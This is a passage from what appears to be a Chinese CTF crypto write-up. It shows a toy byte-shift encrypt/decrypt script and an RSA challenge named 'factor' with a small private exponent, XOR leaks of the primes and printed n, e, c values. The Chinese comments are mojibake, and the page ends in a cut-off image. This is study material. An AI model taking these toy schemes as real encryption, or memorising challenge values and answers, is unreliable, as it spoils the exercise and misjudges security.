class="line">647669776d757e83817372816e707479707c888789757c92788d84838b878d9d</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_string</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;å°†è¾“å…¥çš„å­—ç¬¦ä¸²è¿›è¡ŒåŠ å¯†ï¼Œé€ä¸ªå­—èŠ‚é€’å¢åŠ &quot;&quot;&quot;</span></span><br><span class="line">    encrypted_bytes = <span class="built_in">bytearray</span>(s, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypted_bytes)):</span><br><span class="line">        encrypted_bytes[i] += (i + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> encrypted_bytes.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_string</span>(<span class="params">hex_string</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;å°†åŠ å¯†åçš„16è¿›åˆ¶å­—ç¬¦ä¸²è§£å¯†&quot;&quot;&quot;</span></span><br><span class="line">    encrypted_bytes = <span class="built_in">bytearray</span>.fromhex(hex_string)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypted_bytes)):</span><br><span class="line">        encrypted_bytes[i] -= (i + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> encrypted_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;é€‰æ‹©åŠŸèƒ½ï¼š&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;1. åŠ å¯†å­—ç¬¦ä¸²&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;2. è§£å¯†å­—ç¬¦ä¸²&quot;</span>)</span><br><span class="line">    choice = <span class="built_in">input</span>(<span class="string">&quot;è¾“å…¥ä½ çš„é€‰æ‹©ï¼ˆ1 æˆ– 2ï¼‰ï¼š&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> choice == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        plaintext = <span class="built_in">input</span>(<span class="string">&quot;è¾“å…¥è¦åŠ å¯†çš„å­—ç¬¦ä¸²ï¼š&quot;</span>)</span><br><span class="line">        encrypted_string = encrypt_string(plaintext)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;åŠ å¯†åçš„å­—ç¬¦ä¸²ï¼š<span class="subst">&#123;encrypted_string&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> choice == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        hex_string = <span class="built_in">input</span>(<span class="string">&quot;è¾“å…¥åŠ å¯†åçš„16è¿›åˆ¶å­—ç¬¦ä¸²ï¼š&quot;</span>)</span><br><span class="line">        decrypted_string = decrypt_string(hex_string)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;è§£å¯†åçš„å­—ç¬¦ä¸²ï¼š<span class="subst">&#123;decrypted_string&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;æ— æ•ˆçš„é€‰æ‹©ï¼Œè¯·è¾“å…¥1æˆ–2ã€‚&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="factor"><a href="#factor" class="headerlink" title="factor"></a>factor</h3><p>é¢˜ç›®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">hint = os.urandom(<span class="number">36</span>)</span><br><span class="line">tmp = bytes_to_long(hint)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">d = getPrime(<span class="number">400</span>)</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = gmpy2.invert(d,phi)</span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">leak1 = p^tmp</span><br><span class="line">leak2 = q^tmp</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;leak1 = <span class="subst">&#123;leak1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;leak2 = <span class="subst">&#123;leak2&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 145462084881728813723574366340552281785604069047381248513937024180816353963950721541845665931261230969450819680771925091152670386983240444354412170994932196142227905635227116456476835756039585419001941477905953429642459464112871080459522266599791339252614674500304621383776590313803782107531212756620796159703</span></span><br><span class="line"><span class="string">e = 10463348796391625387419351013660920157452350067191419373870543363741187885528042168135531161031114295856009050029737547684735896660393845515549071092389128688718675573348847489182651631515852744312955427364280891600765444324519789452014742590962030936762237037273839906251320666705879080373711858513235704113</span></span><br><span class="line"><span class="string">c = 60700608730139668338977678601901211800978306010063875269252006068222163102100346920465298044880066999492746508990629867396189713753873657197546664480233269806308415874191048149900822050054539774370134460339681949131037133783273410066318511508768512778132786573893529705068680583697574367357381635982316477364</span></span><br><span class="line"><span class="string">leak1 = 13342820281239625174817085182586822673810894195223942279061039858850534510679297962596800315875604798047264337469828123370586584840078728059729121435462780</span></span><br><span class="line"><span class="string">leak2 = 10901899434728393473569359914062349292412269512201554924835672710780580634465799069211035290729536290605761024818770843901501694556825737462457471235151530</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="data:image/png;base64,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